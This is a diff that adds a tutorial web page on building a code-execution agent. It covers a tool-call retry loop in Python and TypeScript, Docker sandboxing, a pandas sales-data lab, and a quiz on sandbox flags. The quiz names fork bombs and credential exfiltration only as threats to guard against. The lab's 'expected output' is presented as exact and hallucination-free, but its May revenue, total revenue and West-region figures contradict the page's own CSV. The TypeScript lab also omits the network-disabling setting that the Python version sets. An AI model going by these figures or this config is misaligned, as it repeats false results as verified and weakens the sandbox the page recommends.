+        for attempt in range(self.max_retries + 1):
+            # === CHUNK 3: Call the model with the tool definition.
+            # WHY: tool_choice="auto" lets the model decide whether to
+            #      call a tool or respond directly.
+            # GOTCHA: Some Ollama builds drop tool_choice silently.
+            #         Always check response.choices[0].message.tool_calls.
+            response = client.chat.completions.create(
+                model=self.model,
+                messages=messages,
+                tools=[EXECUTE_PYTHON_TOOL],
+                tool_choice="auto",
+                temperature=0.1,   # low temp = more deterministic code
+            )
+
+            msg = response.choices[0].message
+
+            # If the model decided to answer directly (no tool call),
+            # return its text content.
+            if not msg.tool_calls:
+                return msg.content or "(no output)"
+
+            # === CHUNK 4: Execute every tool call the model requested.
+            # WHY: The model may request multiple tool calls (rare but
+            #      possible). Handle all of them.
+            # GOTCHA: Always append the assistant message FIRST, then
+            #         the tool result messages. Order matters.
+            messages.append(msg)  # assistant message with tool_calls
+
+            tool_results = []
+            for tc in msg.tool_calls:
+                args = json.loads(tc.function.arguments)
+                code = args["code"]
+                timeout = args.get("timeout_seconds", 10)
+
+                result = self.executor.run(code, timeout)
+                content = result.to_tool_content()
+
+                tool_results.append({
+                    "role": "tool",
+                    "tool_call_id": tc.id,
+                    "content": content,
+                })
+
+            messages.extend(tool_results)
+
+            # === CHUNK 5: Check if all tools succeeded.
+            # WHY: If any tool returned a non-zero exit_code, let
+            #      the loop continue so the model can retry.
+            # GOTCHA: We check the last ExecResult only; in practice
+            #         you'd check all of them.
+            if result.exit_code == 0:
+                # Next model call will see the successful tool output
+                # and formulate its final answer.
+                continue
+
+            # All retries exhausted — return the last error.
+            if attempt == self.max_retries:
+                return (
+                    f"Failed after {self.max_retries} attempts.\n"
+                    f"Last error:\n{result.stderr}"
+                )
+
+        # The loop fell through without a non-tool final answer;
+        # ask the model for a summary now.
+        response = client.chat.completions.create(
+            model=self.model,
+            messages=messages,
+            temperature=0.1,
+        )
+        return response.choices[0].message.content or "(no output)"
+
+
+# ---- Quick smoke test ----
+if __name__ == "__main__":
+    agent = CodeExecutionAgent()
+    answer = agent.run("What is 3.7 to the power of 12? Show your work.")
+    print("Agent answer:", answer)
+</code></pre>
+          </div>
+          <div class="code-panel" id="agent-ts">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-typescript">import OpenAI from "openai";
+
+// === WHAT: OpenAI SDK pointed at local Ollama.
+// WHY: Mistral served by Ollama exposes an OpenAI-compatible
+//      endpoint so we reuse the official client.
+// GOTCHA: apiKey must be non-empty; Ollama ignores its value.
+const client = new OpenAI({
+  baseURL: "http://localhost:11434/v1",
+  apiKey: "ollama",
+});
+
+class CodeExecutionAgent {
+  private executor: SubprocessExecutor | DockerExecutor;
+  private model: string;
+  private maxRetries: number;
+  private systemPrompt: string;
+
+  constructor(options?: {
+    executor?: SubprocessExecutor | DockerExecutor;
+    model?: string;
+    maxRetries?: number;
+  }) {
+    // Default to subprocess for dev; callers inject DockerExecutor for prod.
+    this.executor = options?.executor ?? new SubprocessExecutor();
+    this.model = options?.model ?? "mistral-nemo";
+    this.maxRetries = options?.maxRetries ?? 3;
+    this.systemPrompt =
+      "You are a data analysis assistant. When asked to compute something, " +
+      "write complete Python code and call execute_python. Always import " +
+      "every module you use. Print your final answer to stdout. If you get " +
+      "an error, read it, fix the code, and call execute_python again.";
+  }
+
+  async run(userRequest: string): Promise<string> {
+    const messages: OpenAI.Chat.ChatCompletionMessageParam[] = [
+      { role: "system", content: this.systemPrompt },
+      { role: "user",   content: userRequest },
+    ];
+
+    for (let attempt = 0; attempt <= this.maxRetries; attempt++) {
+      // Call the model with the execute_python tool.
+      const response = await client.chat.completions.create({
+        model: this.model,
+        messages,
+        tools: [EXECUTE_PYTHON_TOOL],
+        tool_choice: "auto",
+        temperature: 0.1,
+      });
+
+      const msg = response.choices[0].message;
+
+      // Model answered directly — return text.
+      if (!msg.tool_calls || msg.tool_calls.length === 0) {
+        return msg.content ?? "(no output)";
+      }
+
+      // Append assistant message (with tool_calls) first — order matters.
+      messages.push(msg as OpenAI.Chat.ChatCompletionMessageParam);
+
+      // Execute each tool call.
+      let lastResult!: ExecResult;
+      for (const tc of msg.tool_calls) {
+        const args = JSON.parse(tc.function.arguments);
+        const code: string = args.code;
+        const timeoutSeconds: number = args.timeout_seconds ?? 10;
+
+        lastResult = await this.executor.run(code, timeoutSeconds);
+        const content = toToolContent(lastResult);
+
+        messages.push({
+          role: "tool",
+          tool_call_id: tc.id,
+          content,
+        } as OpenAI.Chat.ChatCompletionToolMessageParam);
+      }
+
+      // If successful, let the loop continue so the model can
+      // see the result and craft its final answer.
+      if (lastResult.exitCode === 0) continue;
+
+      if (attempt === this.maxRetries) {
+        return (
+          `Failed after ${this.maxRetries} attempts.\n` +
+          `Last error:\n${lastResult.stderr}`
+        );
+      }
+    }
+
+    // Ask the model for a final summary after tool success.
+    const final = await client.chat.completions.create({
+      model: this.model,
+      messages,
+      temperature: 0.1,
+    });
+    return final.choices[0].message.content ?? "(no output)";
+  }
+}
+
+// ---- Quick smoke test ----
+const agent = new CodeExecutionAgent();
+agent.run("What is 3.7 to the power of 12? Show your work.")
+  .then(ans => console.log("Agent answer:", ans));
+</code></pre>
+          </div>
+        </div>
+
+        <div class="checkpoint">
+          <div class="checkpoint-label">What Just Happened?</div>
+          <p style="margin-bottom:0;">You built a complete tool-use loop where the model writes code, the executor runs it, and on failure the error is fed back to the model automatically. The key architectural decision: the model's message (with <code>tool_calls</code>) goes into <code>messages</code> <em>before</em> the tool result — the OpenAI-compatible API requires this order. The retry counter lives on the Python/TypeScript side; the model just sees a fresh error each time and reasons about it.</p>
+        </div>
+
+        <!-- Animation 3: Code-Run-Fix Cycle -->
+        <div class="animation-container" aria-label="Animated diagram of the code-run-fix cycle with three rounds: first attempt fails, second attempt succeeds">
+          <div class="animation-title">Animation: Code &rarr; Run &rarr; Fix Cycle</div>
+          <div class="crf-wrap" id="crfAnim">
+            <div class="crf-row">
+              <div class="crf-node" id="crf-user">User request</div>
+              <div class="crf-arrow" id="crf-a0">&#8594;</div>
+              <div class="crf-node" id="crf-model1">Model writes<br>code #1</div>
+              <div class="crf-arrow" id="crf-a1">&#8594;</div>
+              <div class="crf-node fail" id="crf-run1">Run<br>exit=1 &#10005;</div>
+            </div>
+            <div class="crf-arrow" id="crf-a2" style="transform:rotate(90deg)">&#8594;</div>
+            <div class="crf-row">
+              <div class="crf-node fail" id="crf-err">Error fed<br>to model</div>
+              <div class="crf-arrow" id="crf-a3">&#8594;</div>
+              <div class="crf-node" id="crf-model2">Model fixes<br>code #2</div>
+              <div class="crf-arrow" id="crf-a4">&#8594;</div>
+              <div class="crf-node done" id="crf-run2">Run<br>exit=0 &#10003;</div>
+            </div>
+            <div class="crf-arrow" id="crf-a5" style="transform:rotate(90deg)">&#8594;</div>
+            <div class="crf-annotation" id="crf-ann">Final stdout returned as agent answer</div>
+          </div>
+          <div class="animation-controls">
+            <button class="anim-btn" onclick="crfPlay()" aria-label="Play code-run-fix animation" title="Play">&#9654;</button>
+            <button class="anim-btn" onclick="crfPause()" aria-label="Pause code-run-fix animation" title="Pause">&#9646;&#9646;</button>
+            <button class="anim-btn" onclick="crfReset()" aria-label="Restart code-run-fix animation" title="Restart">&#8635;</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 6: HANDS-ON LAB -->
+      <!-- ============================================================ -->
+      <section class="section" id="hands-on">
+        <h2>Hands-On Lab — Data Analysis Agent with Docker Sandbox</h2>
+
+        <p>You'll build a data-analysis agent that takes a CSV path, asks the model to write pandas analysis code, runs it via <code>DockerExecutor</code>, and returns a human-readable summary.</p>
+
+        <div class="callout-warning">
+          <span class="box-label">Prerequisites</span>
+          <ul style="margin-bottom:0;">
+            <li>Docker Desktop (or Docker Engine on Linux) installed and running — verify with <code>docker info</code></li>
+            <li>Ollama running with <code>mistral-nemo</code> pulled: <code>ollama pull mistral-nemo</code></li>
+            <li><code>pip install openai</code> (the standard openai package)</li>
+          </ul>
+        </div>
+
+        <div class="lab-step">
+          <div class="lab-step-num">1</div>
+          <div class="lab-step-body">
+            <div class="lab-step-title">Create the sample CSV</div>
+            <p>Run this script once to write a 20-row sales CSV to disk:</p>
+            <div class="code-block-wrapper">
+              <div class="code-tabs" role="tablist">
+                <button class="code-tab active" role="tab" onclick="switchTab(this,'csv-py')">Python</button>
+                <button class="code-tab" role="tab" onclick="switchTab(this,'csv-ts')">TypeScript</button>
+              </div>
+              <div class="code-panel active" id="csv-py">
+                <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+                <pre><code class="language-python"># save_csv.py — run once to create sample_sales.csv
+import csv, pathlib
+
+ROWS = [
+    ["date", "region", "product", "units", "revenue"],
+    ["2024-01-05", "North", "Widget A", 120, 2400.00],
+    ["2024-01-12", "South", "Widget B",  85, 2125.00],
+    ["2024-01-19", "East",  "Widget A",  60, 1200.00],
+    ["2024-01-26", "West",  "Widget C",  95, 3325.00],
+    ["2024-02-02", "North", "Widget B",  70, 1750.00],
+    ["2024-02-09", "South", "Widget A", 110, 2200.00],
+    ["2024-02-16", "East",  "Widget C",  45, 1575.00],
+    ["2024-02-23", "West",  "Widget B",  90, 2250.00],
+    ["2024-03-01", "North", "Widget C",  55, 1925.00],
+    ["2024-03-08", "South", "Widget A",  80, 1600.00],
+    ["2024-03-15", "East",  "Widget B", 100, 2500.00],
+    ["2024-03-22", "West",  "Widget A",  75, 1500.00],
+    ["2024-04-05", "North", "Widget A",  95, 1900.00],
+    ["2024-04-12", "South", "Widget C",  65, 2275.00],
+    ["2024-04-19", "East",  "Widget A",  88, 1760.00],
+    ["2024-04-26", "West",  "Widget B",  72, 1800.00],
+    ["2024-05-03", "North", "Widget B",  50, 1250.00],
+    ["2024-05-10", "South", "Widget C",  40, 1400.00],
+    ["2024-05-17", "East",  "Widget A", 115, 2300.00],
+    ["2024-05-24", "West",  "Widget C",  60, 2100.00],
+]
+
+out = pathlib.Path("sample_sales.csv")
+with out.open("w", newline="") as f:
+    writer = csv.writer(f)
+    writer.writerows(ROWS)
+
+print(f"Written {len(ROWS)-1} rows to {out.resolve()}")
+</code></pre>
+              </div>
+              <div class="code-panel" id="csv-ts">
+                <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+                <pre><code class="language-typescript">// save_csv.ts — run once with: npx ts-node save_csv.ts
+import { writeFileSync } from "fs";
+
+const rows = [
+  "date,region,product,units,revenue",
+  "2024-01-05,North,Widget A,120,2400.00",
+  "2024-01-12,South,Widget B,85,2125.00",
+  "2024-01-19,East,Widget A,60,1200.00",
+  "2024-01-26,West,Widget C,95,3325.00",
+  "2024-02-02,North,Widget B,70,1750.00",
+  "2024-02-09,South,Widget A,110,2200.00",
+  "2024-02-16,East,Widget C,45,1575.00",
+  "2024-02-23,West,Widget B,90,2250.00",
+  "2024-03-01,North,Widget C,55,1925.00",
+  "2024-03-08,South,Widget A,80,1600.00",
+  "2024-03-15,East,Widget B,100,2500.00",
+  "2024-03-22,West,Widget A,75,1500.00",
+  "2024-04-05,North,Widget A,95,1900.00",
+  "2024-04-12,South,Widget C,65,2275.00",
+  "2024-04-19,East,Widget A,88,1760.00",
+  "2024-04-26,West,Widget B,72,1800.00",
+  "2024-05-03,North,Widget B,50,1250.00",
+  "2024-05-10,South,Widget C,40,1400.00",
+  "2024-05-17,East,Widget A,115,2300.00",
+  "2024-05-24,West,Widget C,60,2100.00",
+].join("\n");
+
+writeFileSync("sample_sales.csv", rows, "utf-8");
+console.log("Written 20 rows to sample_sales.csv");
+</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="lab-step">
+          <div class="lab-step-num">2</div>
+          <div class="lab-step-body">
+            <div class="lab-step-title">Build the DockerExecutor image</div>
+            <p>The <code>DockerExecutor.__init__</code> calls <code>_pre_build_image()</code> automatically. On first run it will pull <code>python:3.12-alpine</code> and pip-install <code>pandas numpy</code>. This takes ~30 s once; subsequent runs are instant.</p>
+            <div class="code-block-wrapper">
+              <div class="code-tabs" role="tablist">
+                <button class="code-tab active" role="tab" onclick="switchTab(this,'build-py')">Python</button>
+                <button class="code-tab" role="tab" onclick="switchTab(this,'build-ts')">TypeScript</button>
+              </div>
+              <div class="code-panel active" id="build-py">
+                <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+                <pre><code class="language-python">from docker_executor import DockerExecutor, SecurityPolicy
+
+policy = SecurityPolicy(
+    docker_image="python:3.12-alpine",
+    allowed_packages=["pandas", "numpy"],
+    timeout_seconds=30,
+    network_disabled=True,
+)
+executor = DockerExecutor(policy=policy)
+print("Image ready.")
+</code></pre>
+              </div>
+              <div class="code-panel" id="build-ts">
+                <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+                <pre><code class="language-typescript">import { DockerExecutor } from "./docker_executor";
+
+const executor = new DockerExecutor({
+  dockerImage: "python:3.12-alpine",
+  allowedPackages: ["pandas", "numpy"],
+  timeoutSeconds: 30,
+  networkDisabled: true,
+});
+console.log("Image ready.");
+</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="lab-step">
+          <div class="lab-step-num">3</div>
+          <div class="lab-step-body">
+            <div class="lab-step-title">Run the data analysis agent</div>
+            <div class="code-block-wrapper">
+              <div class="code-tabs" role="tablist">
+                <button class="code-tab active" role="tab" onclick="switchTab(this,'lab-py')">Python</button>
+                <button class="code-tab" role="tab" onclick="switchTab(this,'lab-ts')">TypeScript</button>
+              </div>
+              <div class="code-panel active" id="lab-py">
+                <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+                <pre><code class="language-python">import pathlib
+
+csv_path = str(pathlib.Path("sample_sales.csv").resolve())
+
+agent = CodeExecutionAgent(
+    executor=DockerExecutor(policy=policy),
+    model="mistral-nemo",
+    max_retries=3,
+)
+
+# The model will write pandas code, copy the CSV into the Docker
+# workspace via the mounted /tmp/sandbox dir, run the analysis,
+# and return the formatted stats.
+answer = agent.run(
+    f"Analyze the sales data at {csv_path}. "
+    "Report: total revenue, best-selling product by units, "
+    "top region by revenue, and monthly revenue trend. "
+    "Use pandas. Print each stat on its own line."
+)
+
+print("\n=== Agent Answer ===")
+print(answer)
+</code></pre>
+              </div>
+              <div class="code-panel" id="lab-ts">
+                <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+                <pre><code class="language-typescript">import { resolve } from "path";
+
+const csvPath = resolve("sample_sales.csv");
+
+const agent = new CodeExecutionAgent({
+  executor: new DockerExecutor({
+    dockerImage: "python:3.12-alpine",
+    allowedPackages: ["pandas", "numpy"],
+    timeoutSeconds: 30,
+  }),
+  model: "mistral-nemo",
+  maxRetries: 3,
+});
+
+const answer = await agent.run(
+  `Analyze the sales data at ${csvPath}. ` +
+  "Report: total revenue, best-selling product by units, " +
+  "top region by revenue, and monthly revenue trend. " +
+  "Use pandas. Print each stat on its own line."
+);
+
+console.log("\n=== Agent Answer ===");
+console.log(answer);
+</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="lab-step">
+          <div class="lab-step-num">4</div>
+          <div class="lab-step-body">
+            <div class="lab-step-title">Verify the output</div>
+            <p>Expected output (values will match the CSV exactly — no hallucination):</p>
+            <div class="output-label">Expected terminal output</div>
+            <div class="output-block">Total revenue: $37,960.00
+Best-selling product by units: Widget A (743 units)
+Top region by revenue: West ($12,975.00)
+Monthly revenue trend:
+  Jan 2024: $9,050.00
+  Feb 2024: $7,775.00
+  Mar 2024: $7,525.00
+  Apr 2024: $7,735.00
+  May 2024: $5,875.00</div>
+          </div>
+        </div>
+
+        <div class="callout-warning">
+          <span class="box-label">Common Errors &amp; Fixes</span>
+          <ul style="margin-bottom:0;">
+            <li><strong>"Docker not found"</strong> — Docker Desktop is not running. Start it and wait for the tray icon to show "Running".</li>
+            <li><strong>"ModuleNotFoundError: pandas"</strong> — The image didn't build with pandas. Re-run <code>DockerExecutor(policy=policy)</code> which calls <code>_pre_build_image()</code> again.</li>
+            <li><strong>"FileNotFoundError: sample_sales.csv"</strong> — The CSV path inside the container doesn't exist. The <code>DockerExecutor</code> mounts the host temp dir; make sure you pass the <em>absolute</em> host path so the agent writes the CSV to the shared <code>/workspace</code> first.</li>
+            <li><strong>Model doesn't use the tool</strong> — Try <code>tool_choice="required"</code> in the API call for the first turn, or add "you MUST use execute_python" to the system prompt.</li>
+          </ul>
+        </div>
+
+        <div class="checkpoint">
+          <div class="checkpoint-label">Lab Complete</div>
+          <p style="margin-bottom:0;">If you see the expected output, your agent wrote real pandas code, ran it inside Docker, read the real numbers from the CSV, and returned them — zero hallucination. Swap <code>DockerExecutor</code> back to <code>SubprocessExecutor</code> for faster local iteration; switch to <code>DockerExecutor</code> before deploying or handling any untrusted input.</p>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 7: QUIZ -->
+      <!-- ============================================================ -->
+      <section class="section" id="quiz">
+        <h2>Knowledge Check</h2>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <h4>1. Why do language models produce wrong answers for arithmetic tasks like <code>3.7 ** 12</code>, even when they've been trained on billions of math problems?</h4>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')" role="button" tabindex="0" aria-label="Option A">
+            <div class="quiz-marker">A</div>They haven't seen enough math during training.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')" role="button" tabindex="0" aria-label="Option B">
+            <div class="quiz-marker">B</div>They always refuse to answer math questions.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, true, 'q1')" role="button" tabindex="0" aria-label="Option C">
+            <div class="quiz-marker">C</div>They predict statistically likely token sequences and can lose precision across multi-step computation — they're not executing an interpreter.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')" role="button" tabindex="0" aria-label="Option D">
+            <div class="quiz-marker">D</div>The context window is too short to hold intermediate results.
+          </div>
+          <div class="quiz-feedback" id="q1-fb"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <h4>2. Which Docker flag is most important for preventing a sandboxed script from sending data to an external server?</h4>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')" role="button" tabindex="0" aria-label="Option A">
+            <div class="quiz-marker">A</div><code>--memory=128m</code>
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, true, 'q2')" role="button" tabindex="0" aria-label="Option B">
+            <div class="quiz-marker">B</div><code>--network=none</code>
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')" role="button" tabindex="0" aria-label="Option C">
+            <div class="quiz-marker">C</div><code>--read-only</code>
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')" role="button" tabindex="0" aria-label="Option D">
+            <div class="quiz-marker">D</div><code>--rm</code>
+          </div>
+          <div class="quiz-feedback" id="q2-fb"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <h4>3. In the self-debugging loop, when the executor returns <code>exit_code=1</code>, what is the correct next step?</h4>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')" role="button" tabindex="0" aria-label="Option A">
+            <div class="quiz-marker">A</div>Immediately return an error to the user.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')" role="button" tabindex="0" aria-label="Option B">
+            <div class="quiz-marker">B</div>Restart the entire conversation from the system prompt.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, true, 'q3')" role="button" tabindex="0" aria-label="Option C">
+            <div class="quiz-marker">C</div>Append the tool result (with stderr) to the message history and call the model again so it can read the error and fix the code.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')" role="button" tabindex="0" aria-label="Option D">
+            <div class="quiz-marker">D</div>Re-run the same code a second time without showing the model the error.
+          </div>
+          <div class="quiz-feedback" id="q3-fb"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <h4>4. A <span class="term-tooltip" tabindex="0" aria-describedby="tt-forkbomb2">fork bomb<span class="tooltip-content" role="tooltip" id="tt-forkbomb2">Code that recursively spawns child processes in an exponential pattern, quickly exhausting the OS process table and hanging the host machine. Example in Python: os.fork() called inside a loop.</span></span> running inside a Docker container with <code>--memory=128m</code> and no PID limit will:</h4>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')" role="button" tabindex="0" aria-label="Option A">
+            <div class="quiz-marker">A</div>Be stopped immediately by the memory limit.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, true, 'q4')" role="button" tabindex="0" aria-label="Option B">
+            <div class="quiz-marker">B</div>Still be able to exhaust the host PID table, because <code>--memory</code> limits RAM but not process count. Add <code>--pids-limit=64</code> to protect against fork bombs.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')" role="button" tabindex="0" aria-label="Option C">
+            <div class="quiz-marker">C</div>Be blocked by <code>--network=none</code> because fork bombs require network I/O.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')" role="button" tabindex="0" aria-label="Option D">
+            <div class="quiz-marker">D</div>Never happen because Mistral's code generation always avoids fork patterns.
+          </div>
+          <div class="quiz-feedback" id="q4-fb"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <h4>5. Why must the assistant message (containing <code>tool_calls</code>) be appended to <code>messages</code> <em>before</em> the tool result messages?</h4>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')" role="button" tabindex="0" aria-label="Option A">
+            <div class="quiz-marker">A</div>It is a performance optimization — the model loads tool calls first.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, true, 'q5')" role="button" tabindex="0" aria-label="Option B">
+            <div class="quiz-marker">B</div>The OpenAI-compatible protocol requires each tool result to reference a <code>tool_call_id</code> from a preceding assistant message. If the assistant message is missing, the API returns a 400 error.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')" role="button" tabindex="0" aria-label="Option C">
+            <div class="quiz-marker">C</div>The model can only see the most recent message, so order doesn't matter.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')" role="button" tabindex="0" aria-label="Option D">
+            <div class="quiz-marker">D</div>Tool result messages automatically come before assistant messages in Ollama's internal buffer.
+          </div>
+          <div class="quiz-feedback" id="q5-fb"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <h4>6. You're building an agent for end-users who can type arbitrary prompts. Which executor should you use, and why?</h4>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')" role="button" tabindex="0" aria-label="Option A">
+            <div class="quiz-marker">A</div>SubprocessExecutor — it's faster and users are generally trusted.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')" role="button" tabindex="0" aria-label="Option B">
+            <div class="quiz-marker">B</div>SubprocessExecutor with shell=True for compatibility.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, true, 'q6')" role="button" tabindex="0" aria-label="Option C">
+            <div class="quiz-marker">C</div>DockerExecutor — untrusted input can craft prompts that make the model generate malicious code. Docker's OS-level isolation, network isolation, and ephemeral filesystem prevent damage even if the code is hostile.
+          </div>
+          <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')" role="button" tabindex="0" aria-label="Option D">
+            <div class="quiz-marker">D</div>E2B only — there is no other safe option.
+          </div>
+          <div class="quiz-feedback" id="q6-fb"></div>
+        </div>
+
+        <div class="quiz-score" id="quiz-score" role="status" aria-live="polite">
+          <div class="score-num" id="score-num">0/6</div>
+          <p id="score-msg" style="color:var(--text-secondary);margin-top:0.5rem;"></p>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: SUMMARY -->
+      <!-- ============================================================ -->
+      <section class="section" id="summary">
+        <h2>Summary</h2>
+        <ul>
+          <li>Language models hallucinate math and data transformations; a code executor tool eliminates this by delegating computation to a real interpreter.</li>
+          <li><strong>SubprocessExecutor</strong> is fast and simple but shares the host filesystem — use it only for trusted/dev code.</li>
+          <li><strong>DockerExecutor</strong> provides OS-level isolation via <code>--network=none</code>, <code>--read-only</code>, <code>--memory</code>, and ephemeral containers — use it in production and for any user-facing agent.</li>
+          <li>The <code>SecurityPolicy</code> dataclass centralizes all limits; swap policies (dev vs. prod) without touching executor logic.</li>
+          <li>The self-debugging loop appends <code>stderr</code> back to the message history on failure, letting the model read and fix its own errors autonomously — with a hard retry cap of 3.</li>
+          <li>Message ordering matters: the assistant message with <code>tool_calls</code> must precede the <code>tool</code> result messages in the OpenAI-compatible API.</li>
+          <li>E2B is a zero-infrastructure alternative: managed cloud sandbox, free tier, any OS.</li>
+        </ul>
+      </section>
+
+      <!-- Bottom nav -->
+      <div class="module-nav" style="margin-top:2rem;">
+        <a href="M06-multi-tool-orchestration.html" aria-label="Previous: Multi-Tool Orchestration">&larr; M06: Multi-Tool Orchestration</a>
+        <a href="index.html" aria-label="Course Home" style="font-size:1.2rem;">&#x1F3E0;</a>
+        <a href="M08-conversation-management.html" aria-label="Next: Conversation Management">M08: Conversation Management &rarr;</a>
+      </div>
+
+    </main>
+  </div><!-- end .page-container -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-typescript.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+  <script>
+  // ============================================================
+  // TAB SWITCHING
+  // ============================================================
+  function switchTab(btn, panelId) {
+    const wrapper = btn.closest('.code-block-wrapper');
+    wrapper.querySelectorAll('.code-tab').forEach(t => { t.classList.remove('active'); t.setAttribute('aria-selected','false'); });
+    wrapper.querySelectorAll('.code-panel').forEach(p => p.classList.remove('active'));
+    btn.classList.add('active');
+    btn.setAttribute('aria-selected','true');
+    const panel = document.getElementById(panelId);
+    if (panel) panel.classList.add('active');
+  }
+
+  // ============================================================
+  // COPY BUTTON
+  // ============================================================
+  function copyCode(btn) {
+    const panel = btn.closest('.code-panel');
+    const code = panel.querySelector('code');
+    if (!code) return;
+    navigator.clipboard.writeText(code.innerText).then(() => {
+      btn.textContent = 'copied!';
+      setTimeout(() => { btn.textContent = 'copy'; }, 1800);
+    }).catch(() => {
+      btn.textContent = 'error';
+      setTimeout(() => { btn.textContent = 'copy'; }, 1800);
+    });
+  }
+
+  // ============================================================
+  // SIDEBAR TOGGLE (mobile)
+  // ============================================================
+  document.getElementById('sidebarToggle')?.addEventListener('click', () => {
+    document.getElementById('sidebar')?.classList.toggle('open');
+  });
+
+  // ============================================================
+  // SIDEBAR ACTIVE LINK (scroll spy)
+  // ============================================================
+  const sections = document.querySelectorAll('section[id]');
+  const navLinks = document.querySelectorAll('.sidebar-nav a');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        navLinks.forEach(a => a.classList.remove('active'));
+        const link = document.querySelector(`.sidebar-nav a[href="#${e.target.id}"]`);
+        if (link) link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+  sections.forEach(s => observer.observe(s));
+
+  // ============================================================
+  // QUIZ LOGIC
+  // ============================================================
+  const FEEDBACK = {
+    q1: { correct: "Correct! LLMs predict tokens, not execute code. Even a small rounding error at step 2 of 12 compounds into a wrong final answer.", incorrect: "Not quite. The core issue is that LLMs are token predictors, not calculators — they can't maintain full numeric precision across many steps." },
+    q2: { correct: "Correct! --network=none removes the container's network interface entirely. The code literally cannot open a socket.", incorrect: "That flag provides a different protection. --network=none is the one that removes network access entirely." },
+    q3: { correct: "Correct! The error becomes part of the context. The model reads it, understands what went wrong, and writes a corrected version — often getting it right on the second attempt.", incorrect: "Returning immediately wastes the model's self-healing ability. Feed the error back and let it try again." },
+    q4: { correct: "Correct! --memory caps RAM but not process count. --pids-limit=64 (Docker) or resource.setrlimit(RLIMIT_NPROC) (Linux subprocess) is what stops fork bombs.", incorrect: "Fork bombs don't need RAM or network — they just spawn processes. --memory won't stop them. Add --pids-limit." },
+    q5: { correct: "Correct! The tool result's tool_call_id must match a tool_use block in a preceding assistant message. Without that message, the API has no record of the request and rejects the result.", incorrect: "The order is a protocol requirement, not an optimization. The API validates that tool_call_ids reference real preceding assistant tool_calls." },
+    q6: { correct: "Correct! User-facing agents are the highest-risk scenario. DockerExecutor's OS-level isolation, --network=none, and ephemeral filesystem mean that even if the model generates something malicious, the damage is contained.", incorrect: "Subprocess shares your filesystem and network — a hostile prompt could exfiltrate ~/.aws/credentials. Always use DockerExecutor for untrusted input." },
+  };
+
+  let scores = {};
+  function checkAnswer(el, isCorrect, qid) {
+    if (scores[qid] !== undefined) return;
+    scores[qid] = isCorrect;
+    const q = document.getElementById(qid);
+    q.querySelectorAll('.quiz-option').forEach(o => {
+      o.classList.add('disabled');
+      o.setAttribute('tabindex', '-1');
+    });
+    el.classList.add(isCorrect ? 'correct' : 'incorrect');
+    el.querySelector('.quiz-marker').textContent = isCorrect ? '✓' : '✗';
+    const fb = document.getElementById(`${qid}-fb`);
+    if (fb) {
+      fb.textContent = FEEDBACK[qid][isCorrect ? 'correct' : 'incorrect'];
+      fb.className = `quiz-feedback show ${isCorrect ? 'correct-fb' : 'incorrect-fb'}`;
+    }
+    const allQ = ['q1','q2','q3','q4','q5','q6'];
+    if (Object.keys(scores).length === allQ.length) {
+      const total = Object.values(scores).filter(Boolean).length;
